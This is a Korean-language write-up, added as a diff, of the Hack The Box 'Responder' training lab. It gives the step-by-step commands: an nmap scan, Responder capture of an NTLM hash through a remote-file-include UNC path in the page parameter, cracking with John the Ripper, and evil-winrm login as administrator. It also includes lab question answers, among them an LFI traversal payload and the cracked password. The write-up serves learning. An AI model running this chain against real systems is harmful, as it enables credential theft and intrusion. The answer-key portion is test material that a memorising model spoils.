@@ -1,0 +1,98 @@
+1. 포트 확인
+nmap -sV htb_ip
+
+
+2. 페이지 접속
+http://htb_ip
+페이지 오류남 > sudo nano /etc/hosts 입력 후 htb_ip	페이지 이름 넣어서 해결
+
+
+3. responder 실행
+터미널에서 sudo responder -I tun0 실행 후 ip 복사
+파라미터 추가 /?page=//10.10.14.252/somefile
+터미널 확인
+
+
+4. 해시값 크래킹
+john --wordlist=/usr/share/wordlists/rockyou.txt '해시값'
+하면 길어서 안됨
+echo '해시값' > hash.txt 로 저장 후 다시 시도
+john --wordlist=/usr/share/wordlists/rockyou.txt 해시파일
+압축이 안되어 압축해제 후 다시 시도
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+john --wordlist=/usr/share/wordlists/rockyou.txt 해시파일
+비밀번호 확인
+
+
+5. 접속
+evil-winrm -i htb_ip -u administrator -p 크래킹한 비밀번호
+어드민계정으로 접속 됨
+다른 유저 파일로 이동 및 flag 확인
+
+
+-------------------------------
+
+
+1. When visiting the web service using the IP address, what is the domain that we are being redirected to?
+IP 주소를 사용하여 웹 서비스에 접속했을 때, 어떤 도메인으로 리디렉션되나요?
+
+> unika.htb
+
+
+2. Which scripting language is being used on the server to generate webpages?
+서버에서 웹페이지를 생성하는 데 사용되는 스크립팅 언어는 무엇입니까?
+
+> php
+
+
+3. What is the name of the URL parameter which is used to load different language versions of the webpage?
+웹페이지의 여러 언어 버전을 불러오는 데 사용되는 URL 매개변수의 이름은 무엇입니까?
+
+> page
+
+
+4. Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"
+다음 중 어떤 값이 page로컬 파일 포함(LFI) 취약점을 악용하는 예가 될까요? "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"
+
+> ../../../../../../../../windows/system32/drivers/etc/hosts
+
+
+5. Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "./../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"
+다음 중 어떤 값이 page원격 파일 포함(RFI) 취약점을 악용하는 예가 될까요? "french.html", "//10.10.14.6/somefile", "./../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"
+
+> //10.10.14.6/somefile
+
+
+6. What does NTLM stand for?
+NTLM은 무슨 약자인가요?
+
+> New Technology LAN Manager
+
+
+7. Which flag do we use in the Responder utility to specify the network interface?
+응답 유틸리티에서 네트워크 인터페이스를 지정하려면 어떤 플래그를 사용해야 합니까?
+
+> -I
+
+
+8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.
+NetNTLMv2 챌린지/응답을 입력받아 수백만 개의 암호를 시도하여 동일한 응답을 생성하는 암호가 있는지 확인하는 도구가 여러 개 있습니다. 그러한 도구 중 하나가 흔히 로 불리지만 john, 정식 명칭은 무엇일까요?
+
+> john the ripper
+
+
+9. What is the password for the administrator user?
+관리자 계정의 비밀번호는 무엇인가요?
+
+> badminton
+
+
+10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
+복구한 암호를 사용하여 응답자 컴퓨터에 원격으로 액세스하기 위해 Windows 서비스(즉, 해당 컴퓨터에서 실행되는 서비스)를 사용할 것입니다. 해당 서비스는 어떤 TCP 포트를 사용합니까?
+
+> 5985
+
+11. On which user's desktop is the flag located?
+해당 깃발은 어느 사용자의 데스크톱에 있습니까?
+
+> mike
